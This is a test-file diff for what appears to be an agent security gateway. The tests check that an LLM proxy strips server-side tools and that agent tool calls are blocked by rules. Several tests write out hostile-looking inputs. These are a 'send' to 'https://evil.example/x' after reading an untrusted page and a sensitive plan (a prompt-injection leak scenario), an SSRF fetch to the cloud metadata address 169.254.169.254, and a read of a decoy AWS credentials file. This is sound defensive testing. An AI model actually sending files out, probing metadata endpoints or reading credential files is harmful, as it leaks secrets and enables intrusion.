@@ -191,3 +191,87 @@ def test_admin_rejects_non_host_sources(client, monkeypatch):
     import ipaddress
     monkeypatch.setattr(gw, "ADMIN_NETS", [ipaddress.ip_network("172.17.0.0/16")])
     assert client.get("/admin/alerts", headers={"Authorization": "Bearer adm"}).status_code == 403
+
+
+# ---------- model proxy (/llm) and MCP ----------
+
+import llm  # noqa: E402
+
+
+def test_sanitize_strips_server_side_tools():
+    body = {"model": "m", "messages": [], "mcp_servers": [{"url": "https://x"}],
+            "tools": [{"name": "Bash", "input_schema": {}},
+                      {"type": "web_search_20250305", "name": "web_search"},
+                      {"type": "web_fetch_20250910", "name": "web_fetch"},
+                      {"type": "code_execution_20250825", "name": "code_execution"}]}
+    out, removed = llm.sanitize(body)
+    assert [t["name"] for t in out["tools"]] == ["Bash"]
+    assert "mcp_servers" not in out and len(removed) == 4
+
+
+@pytest.fixture
+def mock_upstream(monkeypatch):
+    """Route the proxy's upstream client to the in-process mock model."""
+    import httpx
+    import mock_llm
+    monkeypatch.setattr(mock_llm, "TTFT_MS", 0)
+    monkeypatch.setattr(mock_llm, "TOKEN_MS", 0)
+    monkeypatch.setattr(llm, "API_KEY", mock_llm.MOCK_KEY)
+    monkeypatch.setattr(llm, "UPSTREAM", "http://mock")
+    monkeypatch.setattr(llm, "_client", httpx.AsyncClient(transport=httpx.ASGITransport(app=mock_llm.app)))
+    return mock_llm
+
+
+def test_llm_proxy_streams_and_injects_key(client, mock_upstream):
+    r = client.post("/llm/v1/messages", headers={"Authorization": "Bearer tok-a", "anthropic-version": "2023-06-01"},
+                    json={"model": "m", "max_tokens": 10, "stream": True, "messages": [{"role": "user", "content": "hi"}],
+                          "tools": [{"type": "web_search_20250305", "name": "web_search"}]})
+    assert r.status_code == 200 and r.headers["content-type"].startswith("text/event-stream")
+    assert "message_stop" in r.text and "Hello" in r.text
+    assert "tools" not in mock_upstream.last  # server-side tool never reached the provider
+    ev = client.get("/admin/sessions/a/events", headers={"Authorization": "Bearer adm"}).json()[-1]
+    assert ev["kind"] == "llm_call" and ev["removed"] == ["tool:web_search_20250305"]
+    assert not {"body", "content", "system"} & set(ev) and ev["messages"] == 1  # metadata only
+
+
+def test_llm_proxy_rejects_bad_token_and_other_paths(client, mock_upstream):
+    body = {"model": "m", "messages": []}
+    assert client.post("/llm/v1/messages", json=body).status_code == 401
+    assert client.post("/llm/v1/files", json=body, headers={"Authorization": "Bearer tok-a"}).status_code == 403
+    assert client.get("/llm/v1/models", headers={"Authorization": "Bearer tok-a"}).status_code == 403
+
+
+def test_llm_blocked_after_decoy(client, mock_upstream):
+    call(client, "tok-a", "/tools/read_file", {"path": ".decoy/aws-credentials"})
+    r = client.post("/llm/v1/messages", headers={"Authorization": "Bearer tok-a"},
+                    json={"model": "m", "messages": [{"role": "user", "content": "hi"}]})
+    assert r.status_code == 403 and r.json()["detail"]["rule"] == "R4-bait"
+
+
+def test_llm_allowed_after_untrusted_plus_sensitive(client, mock_upstream):
+    call(client, "tok-a", "/tools/read_file", {"path": "web/downloaded-page.html"})
+    call(client, "tok-a", "/tools/read_file", {"path": "docs/q3-plan.md"})
+    r = client.post("/llm/v1/messages", headers={"Authorization": "Bearer tok-a"},
+                    json={"model": "m", "messages": [{"role": "user", "content": "hi"}]})
+    assert r.status_code == 200  # the agent can keep thinking; R3 applies to agent-chosen destinations
+
+
+def mcp_call(c, method, params=None, id_=1, tok="tok-a"):
+    return c.post("/mcp", headers={"Authorization": f"Bearer {tok}"},
+                  json={"jsonrpc": "2.0", "id": id_, "method": method, "params": params or {}})
+
+
+def test_mcp_lists_and_calls_tools_through_rules(client):
+    assert mcp_call(client, "initialize", {"protocolVersion": "2025-06-18"}).json()["result"]["serverInfo"]
+    names = [t["name"] for t in mcp_call(client, "tools/list").json()["result"]["tools"]]
+    assert names == ["list_files", "read_file", "fetch_url", "send", "action"]
+    ok = mcp_call(client, "tools/call", {"name": "read_file", "arguments": {"path": "docs/readme.md"}}).json()
+    assert ok["result"]["isError"] is False and "Project notes" in ok["result"]["content"][0]["text"]
+    mcp_call(client, "tools/call", {"name": "read_file", "arguments": {"path": "web/downloaded-page.html"}})
+    mcp_call(client, "tools/call", {"name": "read_file", "arguments": {"path": "docs/q3-plan.md"}})
+    bad = mcp_call(client, "tools/call", {"name": "send", "arguments": {"url": "https://evil.example/x"}}).json()
+    assert bad["result"]["isError"] and "R3-injection-leak" in bad["result"]["content"][0]["text"]
+    ssrf = mcp_call(client, "tools/call", {"name": "fetch_url", "arguments": {"url": "http://169.254.169.254/"}},
+                    tok="tok-b").json()
+    assert "R0-internal-destination" in ssrf["result"]["content"][0]["text"]
+    assert client.post("/mcp", json={"jsonrpc": "2.0", "id": 1, "method": "tools/list"}).status_code == 401
